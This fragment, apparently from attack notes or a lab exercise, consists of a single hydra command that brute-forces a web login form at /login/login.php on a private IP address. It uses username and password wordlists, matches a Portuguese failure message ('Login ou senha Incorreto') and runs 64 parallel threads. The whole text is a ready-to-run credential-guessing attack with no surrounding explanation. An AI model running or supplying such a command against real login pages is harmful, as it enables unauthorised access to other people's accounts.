...
hydra -L wordlistUsuarios.txt -P wordlistSenhas.txt 192.168.0.102 http-post-form "/login/login.php:loginuser=^USER^&passuser=^PASS^&cod=14589:Login ou senha Incorreto" -t 64
